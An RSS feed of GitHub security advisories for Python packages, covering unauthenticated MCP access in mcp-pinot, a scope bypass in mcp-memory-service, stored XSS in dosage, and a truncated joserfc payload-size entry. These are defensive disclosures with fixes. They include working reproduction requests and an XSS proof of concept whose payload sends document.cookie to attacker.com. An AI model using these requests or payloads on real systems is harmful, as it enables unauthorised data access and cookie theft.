<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-27T23:19:56.552Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mcp-pinot-server] mcp-pinot: Unauthenticated tool invocation via default oauth_enabled=False + host 0.0.0.0 bind]]></title>
        <id>https://github.com/advisories/GHSA-73cv-556c-w3g6</id>
        <link href="https://github.com/advisories/GHSA-73cv-556c-w3g6"/>
        <updated>2026-06-26T21:05:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="resolution">Resolution</h2>
<p>Fixed in <a href="https://github.com/startreedata/mcp-pinot/releases/tag/v3.1.0">v3.1.0</a>, released 2026-05-25. The fix was merged in <a href="https://github.com/startreedata/mcp-pinot/pull/95">PR #95</a> at commit <a href="https://github.com/startreedata/mcp-pinot/commit/1c7d3f9cd384854bf72c127d230bdb32299475ad"><code>1c7d3f9</code></a>.</p>
<p>The fix changes the default HTTP bind host to <code>127.0.0.1</code>, refuses non-loopback HTTP/HTTPS exposure unless OAuth is enabled, makes Helm exposure opt-in and OAuth-gated, and adds parser-backed single-statement read-only validation for <code>read-query</code>.</p>
<h2 id="cvss-evaluation">CVSS evaluation</h2>
<p>Reviewed on 2026-05-25. The advisory remains <strong>Critical</strong> with <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code> = <strong>10.0</strong>.</p>
<p>Rationale:</p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Reason</th>
</tr>
</thead>
<tbody><tr>
<td>AV</td>
<td>Network</td>
<td>The default HTTP server bound to <code>0.0.0.0:8080</code> and accepted remote HTTP requests.</td>
</tr>
<tr>
<td>AC</td>
<td>Low</td>
<td>Exploitation required only a direct MCP tool call.</td>
</tr>
<tr>
<td>PR</td>
<td>None</td>
<td>OAuth was disabled by default.</td>
</tr>
<tr>
<td>UI</td>
<td>None</td>
<td>No user interaction was required.</td>
</tr>
<tr>
<td>S</td>
<td>Changed</td>
<td>The vulnerable MCP server used its server-side credentials to act on the separate Pinot cluster security boundary.</td>
</tr>
<tr>
<td>C</td>
<td>High</td>
<td>Unauthenticated callers could read table data and cluster metadata through server-side Pinot credentials.</td>
</tr>
<tr>
<td>I</td>
<td>High</td>
<td>Unauthenticated callers could create or update schemas and table configs where the server-side account had those privileges.</td>
</tr>
<tr>
<td>A</td>
<td>High</td>
<td>Expensive queries and configuration mutations could degrade or disrupt Pinot availability.</td>
</tr>
</tbody></table>
<h1 id="unauthenticated-tool-invocation-via-default-oauth_enabledfalse--host-0000-bind">Unauthenticated tool invocation via default oauth_enabled=False + host 0.0.0.0 bind</h1>
<h2 id="summary">Summary</h2>
<p><code>mcp-pinot</code> v3.0.1 (and earlier) defaults to running an HTTP MCP server bound to <code>0.0.0.0:8080</code> with no authentication enabled. All MCP tools, including SQL query execution, schema creation, and table-config mutation, are reachable by any network-adjacent caller. The server proxies these calls using server-side Pinot credentials, producing a confused-deputy condition that yields full read/write access to the configured Pinot cluster.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>All releases on <code>main</code>, confirmed in tags v2.1.0 through v3.0.1.</li>
<li>Affected files: <code>mcp_pinot/server.py</code>, <code>mcp_pinot/config.py</code>.</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>Three defaults compose to produce unauthenticated network exposure:</p>
<p><strong>1. Auth is opt-in and defaults to off</strong> (<code>mcp_pinot/config.py:64,328</code>):</p>
<pre><code class="language-python">@dataclass
class ServerConfig:
    ...
    oauth_enabled: bool = False
    ...

def load_server_config() -&gt; ServerConfig:
    return ServerConfig(
        ...
        oauth_enabled=os.getenv("OAUTH_ENABLED", "false").lower() == "true",
        ...
    )
</code></pre>
<p><strong>2. Auth construction is gated by <code>oauth_enabled</code></strong> (<code>mcp_pinot/server.py:26-46</code>):</p>
<pre><code class="language-python">_auth = None
if server_config.oauth_enabled:
    oauth_config = load_oauth_config()
    token_verifier = JWTVerifier(...)
    _auth = OAuthProxy(...)

mcp = FastMCP("Pinot MCP Server", auth=_auth)
</code></pre>
<p>When <code>oauth_enabled</code> is false (default), <code>_auth</code> stays <code>None</code> and <code>FastMCP</code> registers all <code>@mcp.tool</code> endpoints with no authentication.</p>
<p><strong>3. Default bind is all interfaces on a well-known port</strong> (<code>mcp_pinot/config.py:60-61</code>):</p>
<pre><code class="language-python">host: str = "0.0.0.0"
port: int = 8080
</code></pre>
<p>The HTTP transport in <code>server.py:263-268</code> uses these values directly. Any operator following the README's HTTP transport instructions (<code>uv pip install</code>, <code>.env</code> from <code>.env.example</code>, run) ends up with a network-reachable MCP server with no auth.</p>
<h2 id="confused-deputy">Confused-deputy</h2>
<p>The Pinot client uses server-side credentials loaded from environment variables (<code>mcp_pinot/config.py:285-294, 300-315</code>). When an unauthenticated MCP caller invokes <code>read_query</code> or any other tool, the request is executed with the server's <code>PINOT_TOKEN</code> or <code>PINOT_USERNAME</code>/<code>PINOT_PASSWORD</code>, which is typically a privileged service account. The MCP server effectively launders the caller's lack of identity into the server's privileges against the upstream cluster.</p>
<h2 id="exposed-tools">Exposed tools</h2>
<p>All 14 tools in <code>mcp_pinot/server.py</code> are exposed without auth in the default configuration:</p>
<table>
<thead>
<tr>
<th>Tool</th>
<th>Impact when unauthenticated</th>
</tr>
</thead>
<tbody><tr>
<td><code>read_query</code></td>
<td>Arbitrary SELECT against any table allowed by server-side filter (or all tables if no filter)</td>
</tr>
<tr>
<td><code>list_tables</code></td>
<td>Enumerate cluster schemas</td>
</tr>
<tr>
<td><code>table_details</code>, <code>segment_list</code>, <code>segment_metadata_details</code>, <code>tableconfig_schema_details</code>, <code>index_column_details</code>, <code>get_schema</code>, <code>get_table_config</code></td>
<td>Read cluster metadata</td>
</tr>
<tr>
<td><code>create_schema</code>, <code>update_schema</code></td>
<td>Create or mutate Pinot schemas</td>
</tr>
<tr>
<td><code>create_table_config</code>, <code>update_table_config</code></td>
<td>Create or mutate table configurations</td>
</tr>
<tr>
<td><code>reload_table_filters</code></td>
<td>Reload server filter file; response leaks <code>previous_filters</code> and <code>new_filters</code> lists</td>
</tr>
<tr>
<td><code>test_connection</code></td>
<td>Cluster diagnostics including host, port, scheme, database, and auth-mode</td>
</tr>
</tbody></table>
<h2 id="reproduction">Reproduction</h2>
<p>Minimal reproduction against a default-configured <code>mcp-pinot</code> v3.0.1 instance running on <code>http://victim:8080/mcp</code>:</p>
<pre><code class="language-bash"># 1. Enumerate tables (no Authorization header)
curl -X POST http://victim:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{"name":"list_tables","arguments":{}},
    "id":1
  }'

# 2. Read arbitrary table contents (server forwards using its own Pinot credentials)
curl -X POST http://victim:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{
      "name":"read_query",
      "arguments":{"query":"SELECT * FROM &lt;table&gt; LIMIT 100"}
    },
    "id":2
  }'

# 3. Create a new schema (write privileges)
curl -X POST http://victim:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{
      "name":"create_schema",
      "arguments":{
        "schemaJson":"{\"schemaName\":\"attacker_schema\",\"dimensionFieldSpecs\":[{\"name\":\"id\",\"dataType\":\"STRING\"}]}"
      }
    },
    "id":3
  }'
</code></pre>
<h2 id="severity-cvss-31">Severity (CVSS 3.1)</h2>
<p><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code> = <strong>10.0 Critical</strong></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Reason</th>
</tr>
</thead>
<tbody><tr>
<td>AV (Attack Vector)</td>
<td>Network</td>
<td>Server defaults to bind on <code>0.0.0.0:8080</code></td>
</tr>
<tr>
<td>AC (Attack Complexity)</td>
<td>Low</td>
<td>No special conditions, single HTTP request</td>
</tr>
<tr>
<td>PR (Privileges Required)</td>
<td>None</td>
<td>No authentication required in default config</td>
</tr>
<tr>
<td>UI (User Interaction)</td>
<td>None</td>
<td>Direct unauthenticated call</td>
</tr>
<tr>
<td>S (Scope)</td>
<td>Changed</td>
<td>Vulnerable MCP component grants access to a separate Pinot cluster (different security authority)</td>
</tr>
<tr>
<td>C (Confidentiality)</td>
<td>High</td>
<td>Full read of any table data the server-side account can reach</td>
</tr>
<tr>
<td>I (Integrity)</td>
<td>High</td>
<td>Schema and table-config writes via <code>create_schema</code>, <code>update_schema</code>, <code>create_table_config</code>, <code>update_table_config</code></td>
</tr>
<tr>
<td>A (Availability)</td>
<td>High</td>
<td>Heavy queries, malformed configs, or schema overrides can degrade or break the cluster</td>
</tr>
</tbody></table>
<p>If the operator restricts the bind address to <code>127.0.0.1</code> via <code>MCP_HOST</code>, AV drops to <code>Local</code> and the score reduces. But this is not the documented default.</p>
<h2 id="suggested-remediation">Suggested remediation</h2>
<p>Two independent hardenings, both recommended:</p>
<p><strong>A. Refuse to start in an insecure default</strong>, in <code>server.py</code> <code>main()</code>, fail-closed when:</p>
<ul>
<li><code>transport != "stdio"</code></li>
<li><code>server_config.oauth_enabled</code> is <code>False</code></li>
<li><code>server_config.host</code> is not a loopback address (e.g. not in <code>{"127.0.0.1", "::1", "localhost"}</code>)</li>
</ul>
<p>Sample:</p>
<pre><code class="language-python">def _is_loopback(host: str) -&gt; bool:
    return host in {"127.0.0.1", "::1", "localhost"}

def main():
    ...
    if server_config.transport != "stdio" and not server_config.oauth_enabled and not _is_loopback(server_config.host):
        raise SystemExit(
            "Refusing to start: HTTP transport bound to non-loopback host "
            f"({server_config.host}) without OAuth. Set OAUTH_ENABLED=true or "
            "set MCP_HOST=127.0.0.1 for local-only access."
        )
    ...
</code></pre>
<p><strong>B. Default <code>oauth_enabled</code> to <code>True</code></strong> and require explicit opt-out for local development. This matches the principle of secure-by-default for network-facing services.</p>
<p><strong>C. Document the threat model</strong> in README under a "Production deployment" section, including:</p>
<ul>
<li>Explicit warning that the server should not be exposed to untrusted networks without OAuth</li>
<li>Recommendation to set <code>MCP_HOST=127.0.0.1</code> for stdio/local-only deployments</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li><code>mcp_pinot/server.py</code> lines 26-46, 248-269</li>
<li><code>mcp_pinot/config.py</code> lines 56-65, 318-330</li>
<li>FastMCP <code>auth</code> parameter behavior when <code>None</code>: <a href="https://github.com/jlowin/fastmcp">https://github.com/jlowin/fastmcp</a></li>
<li>The Register, May 13 2026: MCP database flaws across Doris, Pinot, RDS</li>
</ul>
<h2 id="reporter">Reporter</h2>
<p>Independent security researcher. Disclosed via GitHub Security Advisory, 2026-05-23.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/startreedata/mcp-pinot/security/advisories/GHSA-73cv-556c-w3g6">https://github.com/startreedata/mcp-pinot/security/advisories/GHSA-73cv-556c-w3g6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49257">https://nvd.nist.gov/vuln/detail/CVE-2026-49257</a></li>
<li><a href="https://github.com/startreedata/mcp-pinot/issues/90">https://github.com/startreedata/mcp-pinot/issues/90</a></li>
<li><a href="https://github.com/startreedata/mcp-pinot/pull/95">https://github.com/startreedata/mcp-pinot/pull/95</a></li>
<li><a href="https://github.com/startreedata/mcp-pinot/commit/1c7d3f9cd384854bf72c127d230bdb32299475ad">https://github.com/startreedata/mcp-pinot/commit/1c7d3f9cd384854bf72c127d230bdb32299475ad</a></li>
<li><a href="https://github.com/advisories/GHSA-73cv-556c-w3g6">https://github.com/advisories/GHSA-73cv-556c-w3g6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73cv-556c-w3g6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-26T21:05:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-memory-service] mcp-memory-service: OAuth read-only clients can write and delete memories through MCP tools/call]]></title>
        <id>https://github.com/advisories/GHSA-2r68-g678-7qr3</id>
        <link href="https://github.com/advisories/GHSA-2r68-g678-7qr3"/>
        <updated>2026-06-26T21:04:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The HTTP MCP JSON-RPC endpoint at <code>/mcp</code> requires only OAuth <code>read</code> scope for all requests, then dispatches <code>tools/call</code> directly to handlers that include mutating tools. A read-only OAuth client can call <code>store_memory</code> and <code>delete_memory</code> through MCP even though the corresponding REST endpoints require <code>write</code> scope.</p>
<h2 id="technical-details">Technical Details</h2>
<p><code>src/mcp_memory_service/web/api/mcp.py</code> declares <code>mcp_endpoint</code> with <code>user: AuthenticationResult = Depends(require_read_access)</code>. For <code>tools/call</code>, it extracts the requested tool name and arguments, then calls <code>handle_tool_call(storage, tool_name, arguments)</code> without passing the authenticated user or checking a per-tool required scope.</p>
<p>The MCP tool registry includes both read tools and write tools. In the same handler file, <code>store_memory</code> creates a <code>Memory</code> object and calls <code>storage.store(...)</code>, while <code>delete_memory</code> calls <code>storage.delete(content_hash)</code>. These operations are reachable with only the <code>read</code> scope.</p>
<p>The REST endpoint demonstrates the intended boundary: <code>POST /api/memories</code> uses <code>Depends(require_write_access)</code> and rejects a read-only token with 403 <code>insufficient_scope</code>.</p>
<h2 id="reproduction">Reproduction</h2>
<ol>
<li>Enable OAuth and disable anonymous access.</li>
<li>Generate a valid OAuth JWT with only <code>scope: read</code>.</li>
<li>Confirm the REST write endpoint rejects it:</li>
</ol>
<pre><code class="language-http">POST /api/memories
Authorization: Bearer &lt;read-only-token&gt;
Content-Type: application/json

{"content":"rest denied control"}
</code></pre>
<p>Expected and observed: HTTP 403 with <code>Required scope 'write' not granted</code>.</p>
<ol start="4">
<li>Send the same read-only token to the MCP endpoint:</li>
</ol>
<pre><code class="language-http">POST /mcp
Authorization: Bearer &lt;read-only-token&gt;
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "store_memory",
    "arguments": {
      "content": "mcp read scope stored this",
      "tags": ["poc"]
    }
  }
}
</code></pre>
<p>Observed: HTTP 200 JSON-RPC success and the storage <code>store</code> sink is reached.</p>
<ol start="5">
<li>A read-only token can also call <code>delete_memory</code> through MCP if it knows a content hash:</li>
</ol>
<pre><code class="language-http">POST /mcp
Authorization: Bearer &lt;read-only-token&gt;
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "delete_memory",
    "arguments": {"content_hash": "&lt;known_hash&gt;"}
  }
}
</code></pre>
<p>Observed: HTTP 200 JSON-RPC success and the storage <code>delete</code> sink is reached.</p>
<h2 id="impact">Impact</h2>
<p>A client intended to be read-only can inject or delete memories through the MCP API. This can corrupt the memory database, influence future agent context, and destroy stored user memories without the OAuth <code>write</code> scope required by the REST API.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>Confirmed present on current main commit <code>c99a922477df41f75a44db11182ae48a57311910</code> and latest release tag <code>v10.65.0</code> (<code>4eb4a62665589f9dd9f8c393afa32de434b4098a</code>).</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Enforce authorization per MCP tool at <code>tools/call</code> time. Require <code>write</code> for <code>store_memory</code> and <code>delete_memory</code>, keep <code>read</code> only for read-only tools, and add regression tests proving direct <code>tools/call</code> to mutating tools is rejected before the handler reaches storage when the caller has only <code>read</code> scope.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-2r68-g678-7qr3">https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-2r68-g678-7qr3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49291">https://nvd.nist.gov/vuln/detail/CVE-2026-49291</a></li>
<li><a href="https://pypi.org/project/mcp-memory-service/10.65.3">https://pypi.org/project/mcp-memory-service/10.65.3</a></li>
<li><a href="https://web.archive.org/web/20260508112116/https://github.com/doobidoo/mcp-memory-service">https://web.archive.org/web/20260508112116/https://github.com/doobidoo/mcp-memory-service</a></li>
<li><a href="https://github.com/advisories/GHSA-2r68-g678-7qr3">https://github.com/advisories/GHSA-2r68-g678-7qr3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r68-g678-7qr3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T21:04:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dosage] Dosage Vulnerable to Stored Cross-Site Scripting (XSS) in HTML/RSS Output Handlers]]></title>
        <id>https://github.com/advisories/GHSA-75mw-h36v-2jv7</id>
        <link href="https://github.com/advisories/GHSA-75mw-h36v-2jv7"/>
        <updated>2026-06-26T21:03:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The HTML and RSS output handlers in <code>dosagelib/events.py</code> write user-controlled content (comic text and page URLs) directly into generated files without proper HTML escaping. When a user scrapes a malicious webcomic and opens the generated HTML/RSS file, attacker-controlled JavaScript can execute in their browser.</p>
<p><strong>CWE</strong>: <a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a> - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)</p>
<hr>
<h2 id="details">Details</h2>
<h3 id="vulnerable-code-locations">Vulnerable Code Locations</h3>
<p>The vulnerability exists in <code>dosagelib/events.py</code> where untrusted content is written to HTML/RSS output without escaping:</p>
<p><strong>1. RSSEventHandler (lines 116-118)</strong></p>
<pre><code class="language-python"># events.py:116-118
if comic.text:
    description += '&lt;br/&gt;%s' % comic.text        # ← Unescaped comic.text
description += '&lt;br/&gt;&lt;a href="%s"&gt;View Comic Online&lt;/a&gt;' % pageUrl  # ← Unescaped URL
</code></pre>
<p><strong>2. HtmlEventHandler (lines 232, 238)</strong></p>
<pre><code class="language-python"># events.py:232
self.html.write(u'&lt;li&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;\n' % (pageUrl, pageUrl))  # ← Unescaped URL

# events.py:238
if text:
    self.html.write(u'&lt;br/&gt;%s\n' % text)  # ← Unescaped text
</code></pre>
<h3 id="root-cause">Root Cause</h3>
<ul>
<li><code>BasicScraper.fetchText()</code> in <code>scraper.py:422</code> calls <code>html.unescape()</code> on extracted text</li>
<li>The output handlers never call <code>html.escape()</code> before writing to files</li>
<li>No sanitization of URLs or text content occurs anywhere in the output pipeline</li>
</ul>
<h3 id="data-flow">Data Flow</h3>
<pre><code>Malicious webcomic page
    ↓
textSearch XPath extracts content (e.g., img/@title, div text)
    ↓
BasicScraper.fetchText() calls html.unescape()
    ↓
comic.text stored without sanitization
    ↓
HtmlEventHandler/RSSEventHandler writes to file without html.escape()
    ↓
Generated HTML/RSS contains executable JavaScript
</code></pre>
<hr>
<h2 id="poc">PoC</h2>
<p>I created a proof-of-concept that demonstrates the vulnerability by simulating a malicious comic source.</p>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>Docker installed and running</li>
</ul>
<h3 id="poc-files">PoC Files</h3>
<p>Create these files in a <code>poc/</code> directory:</p>
<p><strong>1. <code>poc/Dockerfile</code></strong></p>
<pre><code class="language-dockerfile">FROM python:3.11-slim

LABEL description="PoC for dosage Stored XSS vulnerability (CWE-79)"

WORKDIR /app
COPY . /app

# Install dependencies
RUN pip install --no-cache-dir --quiet imagesize lxml requests rich platformdirs

# Install dosage
ENV SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DOSAGE=0.0.0
RUN pip install --no-cache-dir --quiet .

CMD ["python", "poc/poc.py"]
</code></pre>
<p><strong>2. <code>poc/poc.py</code></strong></p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: Stored XSS in dosage HTML/RSS Output Handlers
Demonstrates that untrusted comic content is written to output files unescaped.
"""

import sys
from pathlib import Path
from types import SimpleNamespace

from dosagelib.events import HtmlEventHandler, RSSEventHandler

# XSS payloads simulating malicious webcomic content
MALICIOUS_TEXT = "Funny Comic!&lt;script&gt;fetch('http://attacker.com/?c='+document.cookie)&lt;/script&gt;"
MALICIOUS_URL = "javascript:alert('XSS-via-URL')"

def check_vulnerability(content: str, marker: str, description: str) -&gt; bool:
    """Check if unescaped marker appears in content."""
    if marker.lower() in content.lower():
        print(f"  [VULNERABLE] {description}")
        print(f"               Found unescaped: {marker}")
        return True
    print(f"  [SAFE] {description}")
    return False

def main():
    print("=" * 70)
    print("PoC: Stored XSS in dosage HTML/RSS Output Handlers")
    print("=" * 70)
    print()

    base = Path(__file__).parent / "output"
    base.mkdir(parents=True, exist_ok=True)

    # Create dummy image file
    img_path = base / "payload.png"
    img_path.write_bytes(b"\x89PNG\r\n\x1a\n")

    # Simulate comic with malicious content
    comic = SimpleNamespace(
        scraper=SimpleNamespace(name="MaliciousComic"),
        referrer=MALICIOUS_URL,
        text=MALICIOUS_TEXT,
        url="http://example.com/comic.png"
    )

    vulnerabilities_found = 0

    # Test RSS Handler
    print("[*] Testing RSSEventHandler...")
    rss_handler = RSSEventHandler(str(base), None, False)
    rss_handler.start()
    rss_handler.comicDownloaded(comic, str(img_path))
    rss_handler.end()
    
    rss_path = Path(rss_handler.rssfn)
    rss_content = rss_path.read_text(encoding="utf-8")
    print(f"    Output file: {rss_path}")
    
    if check_vulnerability(rss_content, "javascript:", "pageUrl in RSS href"):
        vulnerabilities_found += 1

    # Test HTML Handler  
    print()
    print("[*] Testing HtmlEventHandler...")
    html_handler = HtmlEventHandler(str(base), None, False)
    html_handler.start()
    html_path = Path(html_handler.html.name)
    html_handler.comicDownloaded(comic, str(img_path), text=MALICIOUS_TEXT)
    html_handler.end()

    html_content = html_path.read_text(encoding="utf-8")
    print(f"    Output file: {html_path}")
    
    if check_vulnerability(html_content, "&lt;script&gt;", "text param in HTML"):
        vulnerabilities_found += 1
    if check_vulnerability(html_content, "javascript:", "pageUrl in HTML link"):
        vulnerabilities_found += 1

    # Show vulnerable content
    print()
    print("-" * 70)
    print("Vulnerable Content in Generated HTML:")
    print("-" * 70)
    for line in html_content.splitlines():
        if "&lt;script&gt;" in line.lower() or "javascript:" in line.lower():
            print(f"  {line}")

    print()
    print("=" * 70)
    print(f"RESULT: {vulnerabilities_found} XSS vulnerability vectors confirmed!")
    print("=" * 70)
    
    return 0 if vulnerabilities_found &gt; 0 else 1

if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<p><strong>3. <code>poc/run_poc.sh</code></strong></p>
<pre><code class="language-bash">#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &amp;&amp; pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." &amp;&amp; pwd)"

echo "[*] Building PoC Docker image..."
docker build -t dosage-xss-poc -f "${SCRIPT_DIR}/Dockerfile" "${ROOT_DIR}" --quiet

echo "[*] Running PoC..."
docker run --rm dosage-xss-poc

echo "[*] Cleanup: docker rmi dosage-xss-poc"
</code></pre>
<h3 id="running-the-poc">Running the PoC</h3>
<pre><code class="language-bash">cd /path/to/dosage
chmod +x poc/run_poc.sh
./poc/run_poc.sh
</code></pre>
<h3 id="poc-output">PoC Output</h3>
<pre><code>======================================================================
PoC: Stored XSS in dosage HTML/RSS Output Handlers
======================================================================

[*] Testing RSSEventHandler...
    Output file: /app/poc/output/dailydose.rss
  [VULNERABLE] pageUrl in RSS href
               Found unescaped: javascript:

[*] Testing HtmlEventHandler...
    Output file: /app/poc/output/html/comics-20251210.html
  [VULNERABLE] text param in HTML
               Found unescaped: &lt;script&gt;
  [VULNERABLE] pageUrl in HTML link
               Found unescaped: javascript:

----------------------------------------------------------------------
Vulnerable Content in Generated HTML:
----------------------------------------------------------------------
  &lt;li&gt;&lt;a href="javascript:alert('XSS-via-URL')"&gt;javascript:alert('XSS-via-URL')&lt;/a&gt;
  &lt;br/&gt;Funny Comic!&lt;script&gt;fetch('http://attacker.com/?c='+document.cookie)&lt;/script&gt;

======================================================================
RESULT: 3 XSS vulnerability vectors confirmed!
======================================================================
</code></pre>
<p>The output shows that:</p>
<ol>
<li>The <code>javascript:</code> URL is written directly into <code>&lt;a href&gt;</code> attributes</li>
<li>The <code>&lt;script&gt;</code> tag from comic text appears unescaped in the HTML body</li>
</ol>
<hr>
<h2 id="impact">Impact</h2>
<h3 id="who-is-affected">Who is affected?</h3>
<ul>
<li>Users who use <code>dosage --output html</code> or <code>dosage --output rss</code> options</li>
<li>Anyone who opens the generated HTML/RSS files in a browser</li>
</ul>
<h3 id="attack-scenario">Attack scenario</h3>
<ol>
<li>Attacker creates or compromises a webcomic site</li>
<li>Attacker injects JavaScript into image title/alt attributes:<pre><code class="language-html">&lt;img src="comic.png" title="Funny!&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
</code></pre>
</li>
<li>Victim runs: <code>dosage MaliciousComic --output html</code></li>
<li>The generated <code>Comics/html/comics-YYYYMMDD.html</code> contains the unescaped script</li>
<li>When victim opens the file, JavaScript executes</li>
</ol>
<h3 id="potential-consequences">Potential consequences</h3>
<ul>
<li><strong>Cookie theft</strong> if files are served over HTTP</li>
<li><strong>Local file access</strong> via <code>file://</code> protocol</li>
<li><strong>Phishing attacks</strong> through DOM manipulation</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Escape all user-controlled content before writing to HTML/RSS:</p>
<pre><code class="language-python">import html

# In RSSEventHandler.comicDownloaded() - events.py around line 116:
if comic.text:
    description += '&lt;br/&gt;%s' % html.escape(comic.text)
description += '&lt;br/&gt;&lt;a href="%s"&gt;View Comic Online&lt;/a&gt;' % html.escape(pageUrl)

# In HtmlEventHandler.comicDownloaded() - events.py around line 232:
self.html.write(u'&lt;li&gt;&lt;a href="%s"&gt;%s&lt;/a&gt;\n' % (html.escape(pageUrl), html.escape(pageUrl)))

# events.py around line 238:
if text:
    self.html.write(u'&lt;br/&gt;%s\n' % html.escape(text))
</code></pre>
<p>For URLs, validating that they use safe protocols (<code>http://</code>, <code>https://</code>) would also help prevent javascript: URLs.</p>
<hr>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Cross-site Scripting (XSS)</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://docs.python.org/3/library/html.html#html.escape">Python html.escape() documentation</a></li>
</ul>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webcomics/dosage/security/advisories/GHSA-75mw-h36v-2jv7">https://github.com/webcomics/dosage/security/advisories/GHSA-75mw-h36v-2jv7</a></li>
<li><a href="https://github.com/advisories/GHSA-75mw-h36v-2jv7">https://github.com/advisories/GHSA-75mw-h36v-2jv7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75mw-h36v-2jv7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T21:03:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[joserfc] joserfc: b64=false RFC7797 JWS payloads bypass JWSRegistry payload-size limits during deserialization]]></title>
        <id>https://github.com/advisories/GHSA-wphv-vfrh-23q5</id>
        <link href="https://github.com/advisories/GHSA-wphv-vfrh-23q5"/>
        <updated>2026-06-26T20:59:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="rfc7797-b64false-jws-payloads-bypass-jwsregistry-payload-size-limits-during-deserialization">RFC7797 b64=false JWS payloads bypass JWSRegistry payload-size limits during deserialization</h1>
<h2 id="summary">Summary</h2>
<p>Testing revealed that <code>joserfc</code> accepts oversized RFC7797 <code>b64=false</code> JWS payloads without applying <code>JWSRegistry.max_payload_length</code>.</p>
<p>The normal JWS compact and flattened JSON paths reject payloads above the configured payload-size limit with <code>ExceededSizeError</code>. The RFC7797 unencoded payload paths do not make the same check. A valid <code>b64=false</code> compact or flattened JSON JWS can therefore deserialize successfully with a payload larger than <code>JWSRegistry.max_payload_length</code>.</p>
<p>This creates a moderate availability/resource-exhaustion risk for applications that accept lower-trust JWS values and rely on <code>joserfc</code> to reject oversized token content during verification.</p>
<h2 id="affected-product">Affected Product</h2>
<ul>
<li>Package: <code>joserfc</code></li>
<li>Ecosystem: <code>pip</code></li>
<li>Audited release: <code>1.6.5</code></li>
<li>Audit tag: <code>1.6.5</code></li>
<li>Audit commit: <code>881712980934fb601bed26fe3ae1ec0b7780e6f7</code></li>
<li>Tested affected releases: <code>1.3.4</code>, <code>1.3.5</code>, <code>1.4.2</code>, <code>1.6.2</code>, <code>1.6.3</code>, <code>1.6.4</code>, <code>1.6.5</code></li>
<li>Fixed release: none known</li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>In <code>joserfc</code> 1.6.5, the default JWS registry has <code>max_payload_length = 128000</code> and exposes <code>validate_payload_size()</code>.</p>
<p>The normal compact extraction path calls that check before base64url-decoding the payload. The RFC7797 compact path validates the header and signature segment sizes, then assigns the unencoded payload directly:</p>
